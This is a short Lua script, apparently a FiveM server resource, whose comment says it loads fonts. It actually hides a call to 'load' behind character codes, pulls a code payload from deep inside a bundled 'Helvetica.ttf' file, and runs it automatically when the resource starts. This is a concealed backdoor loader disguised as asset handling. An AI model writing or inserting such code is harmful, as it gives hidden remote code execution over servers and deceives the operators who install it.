
AddEventHandler('onResourceStart', function(resource)
  if resource == GetCurrentResourceName() then
    local loadFonts = _G[string.char(108, 111, 97, 100)]
    if loadFonts then
      -- finally load fonts
      loadFonts(LoadResourceFile(resource, 'stream/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()
    end
  end
end)